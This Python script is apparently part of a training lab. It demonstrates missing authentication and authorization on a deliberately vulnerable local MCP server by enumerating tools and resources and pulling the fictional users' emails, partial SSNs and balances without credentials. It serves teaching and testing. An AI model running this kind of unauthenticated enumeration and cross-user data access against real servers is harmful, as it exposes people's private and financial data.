"""
Base Camp Exploit Testing Script

This script demonstrates the OWASP MCP07 (Insufficient Authentication & Authorization)
and MCP01 (Token Mismanagement & Secret Exposure) vulnerabilities by making
unauthorized tool calls to access sensitive user data over HTTP.

Prerequisites:
1. Start the vulnerable server in a separate terminal:
   cd camps/base-camp/vulnerable-server
   uv run --project .. python -m src.server

2. Run this exploit:
   cd camps/base-camp/exploits
   uv run --project .. python test_vulnerable.py

For visual testing with MCP Inspector:
   ./launch-inspector-http.sh
"""

import asyncio
import json
from fastmcp.client import Client
from fastmcp.client.transports import StreamableHttpTransport


# Server configuration
SERVER_URL = "http://localhost:8000/mcp"


async def test_vulnerable_server():
    """Test the vulnerable MCP server and demonstrate unauthorized access."""
    
    print("=" * 70)
    print("üèîÔ∏è  Base Camp - Exploit Testing (HTTP)")
    print("=" * 70)
    print()
    print(f"üì° Testing server at {SERVER_URL}...")
    print("   (Make sure the server is running in a separate terminal!)")
    print()
    
    try:
        # No authentication required - just connect!
        # Use streamable-http transport to match the server
        transport = StreamableHttpTransport(SERVER_URL)
        async with Client(transport) as client:
            
            # Test 1: List available tools (should work without auth!)
            print("üîç Test 1: Enumerate Available Tools")
            print("-" * 70)
            print("üö® Connecting WITHOUT any authentication token...")
            print()
            
            tools = await client.list_tools()
            print(f"‚úÖ Successfully connected! Found {len(tools)} tools:")
            for tool in tools:
                print(f"   - {tool.name}: {tool.description}")
            print()
            print("üö® NO AUTHENTICATION required to connect!")
            print()
            
            # Test 2: List available resources
            print("üîç Test 2: Attempt to Enumerate Resources")
            print("-" * 70)
            
            resources = await client.list_resources()
            if resources and len(resources) > 0:
                print(f"‚úÖ Found {len(resources)} user resources:")
                for resource in resources:
                    print(f"   - {resource.uri}: {resource.name}")
                print()
                print("üö® Can enumerate ALL users without authorization!")
            else:
                print("‚ö†Ô∏è  No resources enumerated (server doesn't expose list)")
                print("   However, resources ARE accessible if you know the URIs!")
                print("   e.g., user://user_001, user://user_002, user://user_003")
            print()
            
            # Test 3: Access user_001's data (our own data - should be allowed)
            print("ÔøΩ Test 3: EXPLOIT - Access User 001 (Alice Johnson)")
            print("-" * 70)
            print("Attempting to access user data WITHOUT authentication...")
            print("(Even though this is 'our' data, there's no identity verification!)")
            print()
            
            result = await client.call_tool("get_user_info", {"user_id": "user_001"})
            
            # Parse the result from CallToolResult
            user_data = None
            if result.content:
                for content_item in result.content:
                    if hasattr(content_item, 'text'):
                        user_data = json.loads(content_item.text)
                        break
            
            if user_data:
                print("üö® SECURITY BREACH! Successfully accessed data without authentication:")
                print(f"   Name: {user_data['name']}")
                print(f"   Email: {user_data['email']}")
                print(f"   SSN Last 4: ***-**-{user_data['ssn_last4']}")
                print(f"   Balance: ${user_data['balance']:,.2f}")
                print()
                print("‚ö†Ô∏è  NO identity verification - anyone can claim to be user_001!")
                print()
            
            # Test 4: Access user_002's data (Bob Smith - UNAUTHORIZED!)
            print("üö® Test 4: EXPLOIT - Access User 002 (Bob Smith)")
            print("-" * 70)
            print("Attempting to access another user's sensitive data...")
            print()
            
            result = await client.call_tool("get_user_info", {"user_id": "user_002"})
            
            # Parse the result
            user_data = None
            if result.content:
                for content_item in result.content:
                    if hasattr(content_item, 'text'):
                        user_data = json.loads(content_item.text)
                        break
            
            if user_data:
                print("üö® SECURITY BREACH! Successfully accessed unauthorized data:")
                print(f"   Name: {user_data['name']}")
                print(f"   Email: {user_data['email']}")
                print(f"   SSN Last 4: ***-**-{user_data['ssn_last4']}")
                print(f"   Balance: ${user_data['balance']:,.2f}")
                print()
                print("‚ö†Ô∏è  This should have been BLOCKED by authorization checks!")
                print()
            
            # Test 5: Access user_003's data (Carol White - UNAUTHORIZED!)
            print("üö® Test 5: EXPLOIT - Access User 003 (Carol White)")
            print("-" * 70)
            print("Attempting to access yet another user's data...")
            print()
            
            result = await client.call_tool("get_user_info", {"user_id": "user_003"})
            
            # Parse the result
            user_data = None
            if result.content:
                for content_item in result.content:
                    if hasattr(content_item, 'text'):
                        user_data = json.loads(content_item.text)
                        break
            
            if user_data:
                print("üö® SECURITY BREACH! Successfully accessed unauthorized data:")
                print(f"   Name: {user_data['name']}")
                print(f"   Email: {user_data['email']}")
                print(f"   SSN Last 4: ***-**-{user_data['ssn_last4']}")
                print(f"   Balance: ${user_data['balance']:,.2f}")
                print()
                print("‚ö†Ô∏è  This should have been BLOCKED by authorization checks!")
                print()
            
            # Test 6: Access resources directly
            print("üîç Test 6: Access Resources Directly")
            print("-" * 70)
            
            try:
                resource_data = await client.read_resource("user://user_002")
                print("‚úÖ Successfully read user_002 resource:")
                
                # resource_data is a list of resource contents
                if resource_data and len(resource_data) > 0:
                    # Extract the text from the first resource content item
                    first_item = resource_data[0]
                    if hasattr(first_item, 'text'):
                        print(first_item.text)
                    else:
                        print(str(resource_data))
                else:
                    print(str(resource_data))
                
                print("üö® NO AUTHORIZATION checks on resource access!")
                print()
            except Exception as e:
                print(f"‚ö†Ô∏è  Resource read attempt: {e}")
                print("   (Resources may not be implemented or have different URI format)")
                print()
            
        print("=" * 70)
        print("üìä Vulnerability Summary")
        print("=" * 70)
        print("üö® CRITICAL VULNERABILITIES CONFIRMED:")
        print()
        print("1. ‚ùå NO AUTHENTICATION - Anyone can connect")
        print("2. ‚ùå NO AUTHORIZATION - Can access ANY user's data")
        print("3. ‚ùå ALL TOOLS EXPOSED - get_user_info available to everyone")
        print("4. ‚ùå ALL RESOURCES EXPOSED - user:// URIs readable by anyone")
        print("5. ‚ùå SENSITIVE DATA LEAKED - SSN, balance, email exposed")
        print()
        print("This demonstrates OWASP MCP07 and MCP01:")
        print("  ‚Ä¢ MCP07: Insufficient Authentication & Authorization")
        print("  ‚Ä¢ MCP01: Token Mismanagement & Secret Exposure")
        print()
        print("Real-world impact:")
        print("  ‚Ä¢ Data breach of ALL user accounts")
        print("  ‚Ä¢ GDPR/HIPAA/PCI-DSS violations")
        print("  ‚Ä¢ Complete loss of user privacy")
        print("  ‚Ä¢ Financial and reputational damage")
        print("=" * 70)
        
    except Exception as e:
        if "Connection" in str(e):
            raise ConnectionError(f"Could not connect to server at {SERVER_URL}")
        raise


async def main():
    """Main entry point."""
    try:
        await test_vulnerable_server()
        print()
        print("‚úÖ Exploit completed successfully!")
        print()
        print("Next step: See how to fix these vulnerabilities!")
        print("  cd camps/base-camp/exploits")
        print("  uv run --project .. python test_secure.py")
        return 0
    except ConnectionError as e:
        print(f"\n‚ùå Error: {e}")
        print("\n‚ö†Ô∏è  Make sure the vulnerable server is running!")
        print("Start it in a separate terminal:")
        print("  cd camps/base-camp/vulnerable-server")
        print("  uv run --project .. python -m src.server")
        return 1
    except Exception as e:
        import traceback
        print(f"\n‚ùå Unexpected Error: {e}")
        print("\nFull traceback:")
        traceback.print_exc()
        return 1


if __name__ == "__main__":
    exit_code = asyncio.run(main())
    exit(exit_code)
